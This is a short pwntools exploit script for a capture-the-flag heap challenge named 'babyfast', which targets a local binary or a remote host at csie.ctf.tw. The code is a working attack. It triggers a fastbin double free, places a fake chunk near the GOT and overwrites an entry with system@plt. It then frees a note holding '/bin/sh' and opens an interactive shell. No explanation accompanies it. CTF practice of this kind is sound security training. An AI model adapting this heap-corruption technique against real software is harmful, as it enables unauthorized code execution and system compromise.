from pwn import *
import sys


Host = 'csie.ctf.tw'
Port = 10142

if len(sys.argv) == 1:
    r = process('./babyfast', env={'LD_PRELOAD': './libc.so.6'})
else:
    r = remote(Host, Port)


def alloc_note(size, data):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(data)

def del_note(idx):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))

fake_chunk = 0x601ffa
system_plt = 0x4007d0

alloc_note(0x50, 'A'*8)
alloc_note(0x50, 'A'*8)

del_note(0)
del_note(1)
del_note(0)

alloc_note(0x50, p64(fake_chunk))
alloc_note(0x50, '/bin/sh\x00')
alloc_note(0x50, 'A'*8)
alloc_note(0x50, 'A'*0xe + p64(system_plt))

del_note(3)

r.interactive()

